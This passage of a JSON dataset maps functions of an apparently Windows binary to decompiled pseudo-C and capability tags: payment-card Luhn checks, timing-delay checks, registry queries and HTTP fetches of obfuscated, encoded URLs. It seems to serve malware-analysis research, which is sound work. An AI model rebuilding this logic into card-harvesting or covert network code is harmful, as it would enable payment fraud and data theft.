(*0x417b70 != 0) {\n            *(unaff_EBP + -0x1c) = *0x417b74;\n            *(unaff_EBP + -0x14) = iVar3;\n            if (iVar3 != iVar1) {\n                do {\n                    fcn.00403aec(1);\n                    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) + 0x1c;\n                } while (*(unaff_EBP + -0x14) != *(unaff_EBP + -0x1c));\n                uVar4 = *(unaff_EBP + 8);\n                iVar3 = *0x417b70;\n            }\n            fcn.004088ab(iVar3);\n        }\n        *0x417b70 = *(unaff_EBP + -0x18);\n        *0x417b78 = uVar4 * 0x1c + *0x417b70;\n        *0x417b74 = (iVar2 / 0x1c) * 0x1c + *0x417b70;\n    }\n    fcn.0040ecc2();\n    return;\n}\n",
        "token_count": 600
    },
    "00404324": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404324(uint arg_8h)\n\n{\n    uint in_EAX;\n    ushort *in_ECX;\n    \n    *(in_ECX + 8) = 0;\n    *(in_ECX + 10) = 7;\n    *in_ECX = 0;\n    fcn.0040a34b(arg_8h);\n    fcn.00404556();\n    fcn.00404786(in_EAX, 0);\n    fcn.0040a34b(arg_8h);\n    fcn.00404823(arg_8h);\n    return;\n}\n",
        "token_count": 132
    },
    "0040458b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040458b(uint *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar2 = arg_8h[4];\n    if (uVar2 < arg_ch) {\n        uVar2 = fcn.0040837f(\"invalid string position\");\n    }\n    if (uVar2 - arg_ch < in_EAX) {\n        in_EAX = uVar2 - arg_ch;\n    }\n    iVar3 = unaff_ESI[4];\n    if (-iVar3 - 1U <= in_EAX) {\n        iVar3 = fcn.00408332(\"string too long\");\n    }\n    if (in_EAX != 0) {\n        cVar1 = fcn.00403c7d(0);\n        if (cVar1 != '\\0') {\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar4 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n            }\n            fcn.00408410(unaff_ESI[4] + puVar4, arg_8h + arg_ch, in_EAX);\n            unaff_ESI[4] = iVar3 + in_EAX;\n            if (0xf < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + iVar3 + in_EAX) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 388
    },
    "0040461f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040461f(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.004040e4(arg_8h);\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.00408332(\"string too long\");\n        }\n        if (unaff_EDI != 0) {\n            cVar1 = fcn.00403c7d(0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                }\n                fcn.00408410(in_EAX[4] + puVar3, arg_8h, unaff_EDI);\n                in_EAX[4] = iVar2 + unaff_EDI;\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + iVar2 + unaff_EDI) = 0;\n            }\n        }\n    }\n    else {\n        puVar3 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            puVar3 = *in_EAX;\n        }\n        fcn.0040458b(in_EAX, arg_8h - puVar3);\n    }\n    return;\n}\n",
        "token_count": 358
    },
    "00404786": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404786(uint *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *unaff_ESI;\n    \n    uVar2 = arg_8h[4];\n    if (uVar2 < arg_ch) {\n        uVar2 = fcn.0040837f(\"invalid string position\");\n    }\n    if (uVar2 - arg_ch < in_EAX) {\n        in_EAX = uVar2 - arg_ch;\n    }\n    iVar3 = unaff_ESI[4];\n    if (-iVar3 - 1U <= in_EAX) {\n        iVar3 = fcn.00408332(\"string too long\");\n    }\n    if (in_EAX != 0) {\n        cVar1 = fcn.00403dd0(0);\n        if (cVar1 != '\\0') {\n            if (7 < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            puVar4 = unaff_ESI;\n            if (7 < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n            }\n            fcn.00408410(puVar4 + unaff_ESI[4] * 2, arg_8h + arg_ch * 2, in_EAX * 2);\n            unaff_ESI[4] = iVar3 + in_EAX;\n            if (7 < unaff_ESI[5]) {\n                unaff_ESI = *unaff_ESI;\n            }\n            *(unaff_ESI + (iVar3 + in_EAX) * 2) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 398
    },
    "00404823": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404823(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t unaff_EDI;\n    \n    cVar1 = fcn.0040420d(arg_8h);\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.00408332(\"string too long\");\n        }\n        if (unaff_EDI != 0) {\n            cVar1 = fcn.00403dd0(0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                if (7 < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                }\n                fcn.00408410(puVar3 + in_EAX[4] * 2, arg_8h, unaff_EDI * 2);\n                in_EAX[4] = iVar2 + unaff_EDI;\n                if (7 < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + (iVar2 + unaff_EDI) * 2) = 0;\n            }\n        }\n    }\n    else {\n        puVar3 = in_EAX;\n        if (7 < in_EAX[5]) {\n            puVar3 = *in_EAX;\n        }\n        fcn.00404786(in_EAX, arg_8h - puVar3 >> 1);\n    }\n    return;\n}\n",
        "token_count": 367
    },
    "004048bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004048bb(uint *arg_8h, uint32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t arg_10h;\n    char cVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *unaff_ESI;\n    uint var_4h;\n    \n    if (arg_ch <= arg_8h[4]) {\n        uVar3 = arg_8h[4] - arg_ch;\n        if (uVar3 < in_EAX) {\n            in_EAX = uVar3;\n        }\n        iVar4 = unaff_ESI[4];\n        if (-iVar4 - 1U <= in_EAX) {\n            iVar4 = fcn.00408332(\"string too long\");\n        }\n        if (in_EAX != 0) {\n            cVar2 = fcn.00403dd0(0);\n            if (cVar2 != '\\0') {\n                puVar5 = unaff_ESI;\n                puVar6 = unaff_ESI;\n                if (7 < unaff_ESI[5]) {\n                    puVar5 = *unaff_ESI;\n                    puVar6 = *unaff_ESI;\n                }\n                arg_10h = in_EAX * 2;\n                fcn.00408a00(puVar5 + arg_10h, puVar6, unaff_ESI[4] * 2);\n                if (unaff_ESI == arg_8h) {\n                    if (arg_ch != 0) {\n                        arg_ch = in_EAX + arg_ch;\n                    }\n                    puVar5 = unaff_ESI;\n                    puVar6 = unaff_ESI;\n                    if (7 < unaff_ESI[5]) {\n                        puVar5 = *unaff_ESI;\n                        puVar6 = *unaff_ESI;\n                    }\n                    fcn.00408a00(puVar5, puVar6 + arg_ch * 2, arg_10h);\n                }\n                else {\n                    if (7 < arg_8h[5]) {\n                        arg_8h = *arg_8h;\n                    }\n                    puVar6 = unaff_ESI;\n                    if (7 < unaff_ESI[5]) {\n                        puVar6 = *unaff_ESI;\n                    }\n                    fcn.00408410(puVar6, arg_8h + arg_ch * 2, arg_10h);\n                }\n                unaff_ESI[4] = iVar4 + in_EAX;\n                if (7 < unaff_ESI[5]) {\n                    unaff_ESI = *unaff_ESI;\n                }\n                *(unaff_ESI + (iVar4 + in_EAX) * 2) = 0;\n            }\n        }\n        return;\n    }\n    fcn.0040837f(\"invalid string position\");\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 663
    },
    "004049ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004049ed(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040ec8c(8);\n    iVar2 = *(unaff_EBP + 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x14) = iVar2;\n    *(unaff_EBP + -4) = 0;\n    while (iVar1 != *(unaff_EBP + 0xc)) {\n        if (iVar2 != 0) {\n            fcn.004035c3();\n        }\n        iVar2 = iVar2 + 0x1c;\n        *(unaff_EBP + 0x10) = iVar2;\n        iVar1 = iVar1 + 0x1c;\n        *(unaff_EBP + 8) = iVar1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040ecc2();\n    return;\n}\n",
        "token_count": 259
    },
    "00404a4e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404a4e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040ec8c(8);\n    iVar2 = *(unaff_EBP + 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x14) = iVar2;\n    *(unaff_EBP + -4) = 0;\n    while (iVar1 != *(unaff_EBP + 0xc)) {\n        if (iVar2 != 0) {\n            fcn.004044e5();\n        }\n        iVar2 = iVar2 + 0x1c;\n        *(unaff_EBP + 0x10) = iVar2;\n        iVar1 = iVar1 + 0x1c;\n        *(unaff_EBP + 8) = iVar1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0040ecc2();\n    return;\n}\n",
        "token_count": 261
    },
    "00405098": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405098(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *puVar2;\n    uint uVar3;\n    uint32_t *unaff_ESI;\n    \n    puVar2 = unaff_ESI[1];\n    if ((in_EAX < puVar2) && (puVar1 = *unaff_ESI,  puVar1 <= in_EAX)) {\n        if (puVar2 == unaff_ESI[2]) {\n            fcn.0040512d();\n        }\n        puVar2 = unaff_ESI[1];\n        if (puVar2 == NULL) goto code_r0x004050de;\n        uVar3 = *(*unaff_ESI + (in_EAX - puVar1 >> 2) * 4);\n    }\n    else {\n        if (puVar2 == unaff_ESI[2]) {\n            fcn.0040512d();\n        }\n        puVar2 = unaff_ESI[1];\n        if (puVar2 == NULL) goto code_r0x004050de;\n        uVar3 = *in_EAX;\n    }\n    *puVar2 = uVar3;\ncode_r0x004050de:\n    unaff_ESI[1] = unaff_ESI[1] + 4;\n    return;\n}\n",
        "token_count": 292
    },
    "0040525e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040525e(uint arg_8h)\n\n{\n    uchar *in_EAX;\n    uint unaff_EBX;\n    \n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0xf;\n    *in_EAX = 0;\n    fcn.0040a2c0(arg_8h);\n    fcn.004044b2();\n    fcn.0040a2c0(arg_8h);\n    fcn.0040461f(arg_8h);\n    fcn.0040458b(unaff_EBX, 0);\n    return;\n}\n",
        "token_count": 145
    },
    "004052ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create HTTP request",
            "connect to URL",
            "read data from Internet",
            "receive data"
        ],
        "decompiled_code": "\nvoid fcn.004052ac(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *unaff_EBX;\n    char *arg_8h;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint in_stack_ffffff68;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    var_64h = (*_sym.imp.WININET.dll_InternetOpenA)(\"Chrome\", 0, 0, 0, 0);\n    arg_8h = \"bGQM/LBfQQzdTnrTse8BeYqSrkuIF5gJTMsGusxV+Zw=\";\n    fcn.00403597(\"bGQM/LBfQQzdTnrTse8BeYqSrkuIF5gJTMsGusxV+Zw=\");\n    puVar1 = fcn.00407d97(arg_8h, in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, in_stack_ffffff64, \n                          in_stack_ffffff68);\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    uVar2 = (*_sym.imp.WININET.dll_InternetOpenUrlA)(var_64h, puVar1, 0, 0, 0x80000000, 0);\n    fcn.0040135c(1);\n    puVar1 = &var_44h;\n    iVar3 = (*_sym.imp.WININET.dll_InternetReadFile)(uVar2, puVar1, 0x40, &var_68h);\n    if (iVar3 == 0) {\n        fcn.00403597(0x413b71);\n    }\n    else {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(var_64h);\n        *(unaff_EBX + 0x10) = 0;\n        *(unaff_EBX + 0x14) = 0xf;\n        *unaff_EBX = 0;\n        fcn.00403be0();\n    }\n    fcn.004083f8(puVar1);\n    return;\n}\n",
        "token_count": 557
    },
    "0040536d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create HTTP request",
            "connect to URL",
            "read data from Internet",
            "receive data"
        ],
        "decompiled_code": "\nvoid fcn.0040536d(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *unaff_EBX;\n    char *arg_8h;\n    uint uVar3;\n    char *arg_8h_00;\n    uint in_stack_ffffff04;\n    uint in_stack_ffffff08;\n    uint in_stack_ffffff0c;\n    uint in_stack_ffffff10;\n    uint in_stack_ffffff14;\n    uint uVar4;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_98h;\n    uint var_7ch;\n    uint var_60h;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    var_b8h = (*_sym.imp.WININET.dll_InternetOpenA)(\"Chrome\", 0, 0, 0, 0);\n    arg_8h_00 = \"K3MX+a0RHFrkWGCY\";\n    fcn.00403597(\"K3MX+a0RHFrkWGCY\");\n    uVar3 = 0x4053b3;\n    fcn.00407d97(arg_8h_00, in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c, in_stack_ffffff10, \n                 in_stack_ffffff14);\n    uVar4 = 0x416cc4;\n    arg_8h = \"bGQM/PlKQULaUCOZvrsNcdCUs0jGDcNWBNoMssw=\";\n    fcn.00403597(\"bGQM/PlKQULaUCOZvrsNcdCUs0jGDcNWBNoMssw=\");\n    fcn.00407d97(arg_8h, uVar3, arg_8h_00, in_stack_ffffff04, in_stack_ffffff08, in_stack_ffffff0c);\n    fcn.004043c4(&fcn.0040536d::var_7ch, in_stack_ffffff14);\n    puVar1 = fcn.004043e8(uVar4);\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    uVar3 = (*_sym.imp.WININET.dll_InternetOpenUrlA)(var_b8h, puVar1, 0, 0, 0x80000000, 0);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    puVar1 = &fcn.0040536d::var_44h;\n    iVar2 = (*_sym.imp.WININET.dll_InternetReadFile)(uVar3, puVar1, 0x40, &fcn.0040536d::var_bch);\n    if (iVar2 == 0) {\n        fcn.00403597(0x413b71);\n    }\n    else {\n        (*_sym.imp.WININET.dll_InternetCloseHandle)(var_b8h);\n        *(unaff_EBX + 0x10) = 0;\n        *(unaff_EBX + 0x14) = 0xf;\n        *unaff_EBX = 0;\n        fcn.00403be0();\n    }\n    fcn.004083f8(puVar1);\n    return;\n}\n",
        "token_count": 786
    },
    "00405847": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00405847(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint32_t arg_8h_00;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_21h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    iVar2 = 0;\n    var_28h = 0;\n    if ((*0x417b84 - *0x417b80) / 0x1c != 0) {\n        do {\n            iVar1 = *0x417b80 + iVar2;\n            fcn.00403573(iVar1);\n            in_stack_ffffffb8 =\n                 fcn.004067a4(&fcn.00405847::var_21h + 1, iVar1, in_stack_ffffffa8, in_stack_ffffffac, in_stack_ffffffb0\n                              , in_stack_ffffffb4, in_stack_ffffffb8);\n            in_stack_ffffffb4 = 0x4058a5;\n            fcn.0040458b(in_stack_ffffffb8, 0);\n            fcn.0040135c(1);\n            in_stack_ffffffb0 = 0x1c;\n            var_28h = var_28h + 1;\n            iVar2 = iVar2 + 0x1c;\n        } while (var_28h < (*0x417b84 - *0x417b80) / 0x1c);\n    }\n    var_21h._0_1_ = 10;\n    iVar2 = *0x416ddc;\n    if (*0x416df0 < 0x10) {\n        iVar2 = 0x416ddc;\n    }\n    iVar1 = *0x416ddc;\n    if (*0x416df0 < 0x10) {\n        iVar1 = 0x416ddc;\n    }\n    fcn.0040437a(&fcn.00405847::var_28h, iVar1, iVar2 + *0x416dec);\n    iVar2 = *0x416ddc;\n    if (*0x416df0 < 0x10) {\n        iVar2 = 0x416ddc;\n    }\n    arg_8h_00 = var_28h;\n    fcn.004036a1(var_28h, iVar2 + *0x416dec);\n    var_21h._0_1_ = 0xd;\n    iVar2 = *0x416ddc;\n    if (*0x416df0 < 0x10) {\n        iVar2 = 0x416ddc;\n    }\n    iVar1 = *0x416ddc;\n    if (*0x416df0 < 0x10) {\n        iVar1 = 0x416ddc;\n    }\n    fcn.0040437a(&fcn.00405847::var_28h, iVar1, iVar2 + *0x416dec);\n    iVar2 = *0x416ddc;\n    if (*0x416df0 < 0x10) {\n        iVar2 = 0x416ddc;\n    }\n    fcn.004036a1(var_28h, iVar2 + *0x416dec);\n    fcn.00403573(0x416ddc);\n    fcn.004083f8(arg_8h_00);\n    return;\n}\n",
        "token_count": 823
    },
    "00406990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00406990(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    uint *arg_8h_00;\n    uchar auStackY10008 [9936];\n    uint uStackY72;\n    uint var_4h;\n    \n    fcn.0040e740();\n    auStackY10008[0] = 0;\n    fcn.0040a370();\n    (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    arg_8h_00 = arg_8h;\n    if (arg_1ch < 0x10) {\n        arg_8h_00 = &fcn.00406990::arg_8h;\n    }\n    (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n    fcn.00403597(&stack0xffffd8e8);\n    uStackY72 = 0x406a36;\n    fcn.0040135c(1);\n    fcn.004083f8(arg_8h_00);\n    return;\n}\n",
        "token_count": 273
    },
    "00406a4b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a4b(uint *arg_8h)\n\n{\n    char *arg_10h;\n    char **in_EAX;\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint32_t in_ECX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h = in_EAX[4];\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    if ((((arg_10h != NULL) || (arg_8h[4] <= in_ECX && in_ECX != arg_8h[4])) && (in_ECX < arg_8h[4])) &&\n       (pcVar3 = arg_8h[4] - in_ECX,  arg_10h <= pcVar3)) {\n        pcVar3 = pcVar3 + (1 - arg_10h);\n        if (0xf < arg_8h[5]) {\n            arg_8h = *arg_8h;\n        }\n        iVar2 = arg_8h + in_ECX;\n        while ((arg_8h_00 = fcn.0040a5b0(iVar2, *in_EAX, pcVar3),  arg_8h_00 != 0 &&\n               (iVar1 = fcn.00408d61(arg_8h_00, in_EAX, arg_10h),  iVar1 != 0))) {\n            pcVar3 = pcVar3 + (iVar2 - arg_8h_00) + -1;\n            iVar2 = arg_8h_00 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 388
    },
    "00406ae3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406ae3(uint arg_8h)\n\n{\n    char **in_EAX;\n    int32_t iVar1;\n    char **ppcVar2;\n    int32_t iVar3;\n    char **ppcVar4;\n    \n    iVar1 = fcn.0040a2c0(arg_8h);\n    if ((iVar1 == 0) || (in_EAX[4] == NULL)) {\ncode_r0x00406b4f:\n        iVar1 = -1;\n    }\n    else {\n        ppcVar4 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            ppcVar4 = *in_EAX;\n        }\n        ppcVar4 = ppcVar4 + in_EAX[4] + -1;\n        while (iVar3 = fcn.0040a5b0(arg_8h, *ppcVar4, iVar1),  iVar3 == 0) {\n            ppcVar2 = in_EAX;\n            if (0xf < in_EAX[5]) {\n                ppcVar2 = *in_EAX;\n            }\n            if (ppcVar4 == ppcVar2) goto code_r0x00406b4f;\n            ppcVar4 = ppcVar4 + -1;\n        }\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        iVar1 = ppcVar4 - in_EAX;\n    }\n    return iVar1;\n}\n",
        "token_count": 335
    },
    "00406b59": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406b59(uint32_t arg_8h, uint *arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t arg_8h_00;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint32_t extraout_ECX;\n    int32_t arg_ch_00;\n    uint *unaff_ESI;\n    uint32_t unaff_EDI;\n    ulong uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar5 = unaff_ESI[4];\n    if ((unaff_EDI <= uVar5) && (arg_10h <= arg_ch[4])) {\n        uVar2 = uVar5 - unaff_EDI;\n        uVar6 = CONCAT44(uVar5, uVar2);\n        if (uVar2 < arg_8h) {\n            arg_8h = uVar2;\n        }\n        uVar2 = arg_ch[4] - arg_10h;\n        if (uVar2 < arg_14h) {\n            arg_14h = uVar2;\n        }\n        uVar5 = uVar5 - arg_8h;\n        if (-arg_14h - 1 <= uVar5) {\n            uVar6 = fcn.00408332(\"string too long\");\n            uVar5 = extraout_ECX;\n        }\n        uVar5 = uVar5 + arg_14h;\n        uVar2 = uVar6 - arg_8h;\n        if (uVar6 >> 0x20 < uVar5) {\n            fcn.00403c7d(0);\n        }\n        if (unaff_ESI == arg_ch) {\n            if (arg_8h < arg_14h) {\n                if (unaff_EDI < arg_10h) {\n                    if (arg_10h < unaff_EDI + arg_8h) {\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        fcn.00408a00(puVar4 + unaff_EDI, puVar3 + arg_10h, arg_8h);\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        fcn.00408a00(puVar4 + arg_14h + unaff_EDI, puVar3 + arg_8h + unaff_EDI, uVar2);\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        uVar2 = arg_14h - arg_8h;\n                        arg_ch_00 = puVar3 + arg_14h + arg_10h;\n                        arg_8h_00 = puVar4 + arg_8h + unaff_EDI;\n                    }\n                    else {\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        fcn.00408a00(puVar4 + arg_14h + unaff_EDI, puVar3 + arg_8h + unaff_EDI, uVar2);\n                        puVar4 = unaff_ESI;\n                        puVar3 = unaff_ESI;\n                        if (0xf < unaff_ESI[5]) {\n                            puVar4 = *unaff_ESI;\n                            puVar3 = *unaff_ESI;\n                        }\n                        arg_ch_00 = puVar3 + arg_14h + (arg_10h - arg_8h);\n                        arg_8h_00 = puVar4 + unaff_EDI;\n                        uVar2 = arg_14h;\n                    }\n                }\n                else {\n                    puVar4 = unaff_ESI;\n                    puVar3 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar4 = *unaff_ESI;\n                        puVar3 = *unaff_ESI;\n                    }\n                    fcn.00408a00(puVar4 + arg_14h + unaff_EDI, puVar3 + arg_8h + unaff_EDI, uVar2);\n                    puVar4 = unaff_ESI;\n                    puVar3 = unaff_ESI;\n                    if (0xf < unaff_ESI[5]) {\n                        puVar4 = *unaff_ESI;\n                        puVar3 = *unaff_ESI;\n                    }\n                    arg_ch_00 = puVar3 + arg_10h;\n                    arg_8h_00 = puVar4 + unaff_EDI;\n                    uVar2 = arg_14h;\n                }\n            }\n            else {\n                puVar4 = unaff_ESI;\n                puVar3 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                    puVar3 = *unaff_ESI;\n                }\n                fcn.00408a00(puVar4 + unaff_EDI, puVar3 + arg_10h, arg_14h);\n                puVar4 = unaff_ESI;\n                puVar3 = unaff_ESI;\n                if (0xf < unaff_ESI[5]) {\n                    puVar4 = *unaff_ESI;\n                    puVar3 = *unaff_ESI;\n                }\n                arg_ch_00 = puVar3 + arg_8h + unaff_EDI;\n                arg_8h_00 = puVar4 + arg_14h + unaff_EDI;\n            }\n            fcn.00408a00(arg_8h_00, arg_ch_00, uVar2);\n        }\n        else {\n            puVar4 = unaff_ESI;\n            puVar3 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar4 = *unaff_ESI;\n                puVar3 = *unaff_ESI;\n            }\n            fcn.00408a00(puVar4 + arg_14h + unaff_EDI, puVar3 + arg_8h + unaff_EDI, uVar2);\n            if (0xf < arg_ch[5]) {\n                arg_ch = *arg_ch;\n            }\n            puVar3 = unaff_ESI;\n            if (0xf < unaff_ESI[5]) {\n                puVar3 = *unaff_ESI;\n            }\n            fcn.00408410(puVar3 + unaff_EDI, arg_ch + arg_10h, arg_14h);\n        }\n        unaff_ESI[4] = uVar5;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + uVar5) = 0;\n        return;\n    }\n    fcn.0040837f(\"invalid string position\");\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1690
    },
    "00407577": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
